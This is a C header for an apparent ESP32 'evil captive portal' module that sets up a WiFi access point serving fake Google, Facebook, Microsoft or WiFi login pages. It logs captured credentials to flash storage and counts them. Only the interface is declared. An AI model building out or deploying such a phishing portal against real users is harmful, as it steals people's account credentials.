/*
 * nesso_portal — Evil captive portal for DAVEY JONES.
 *
 * Creates a WiFi AP with a captive portal that serves a fake login page.
 * Captured credentials are logged to SPIFFS.
 */
#pragma once

#include <stdint.h>
#include <stdbool.h>
#include "esp_err.h"

#ifdef __cplusplus
extern "C" {
#endif

typedef enum {
    PORTAL_TEMPLATE_GOOGLE = 0,
    PORTAL_TEMPLATE_FACEBOOK,
    PORTAL_TEMPLATE_MICROSOFT,
    PORTAL_TEMPLATE_WIFI_LOGIN,
    PORTAL_TEMPLATE_COUNT,
} nesso_portal_template_t;

typedef struct {
    nesso_portal_template_t template_id;
    char ssid[33];        /* AP SSID — NULL uses template default */
    uint8_t channel;      /* 0 = auto */
} nesso_portal_config_t;

#define NESSO_PORTAL_CONFIG_DEFAULTS() ((nesso_portal_config_t){ \
    .template_id = PORTAL_TEMPLATE_WIFI_LOGIN,                   \
    .ssid = {0},                                                 \
    .channel = 1,                                                \
})

/** Start the evil portal AP + HTTP server. Blocks wardrive while active. */
esp_err_t nesso_portal_start(const nesso_portal_config_t *cfg);

/** Stop the portal, return to STA mode. */
esp_err_t nesso_portal_stop(void);

bool nesso_portal_is_active(void);

/** Number of credentials captured this session. */
uint32_t nesso_portal_cred_count(void);

/** Number of clients currently connected to the AP. */
uint8_t nesso_portal_client_count(void);

#ifdef __cplusplus
}
#endif
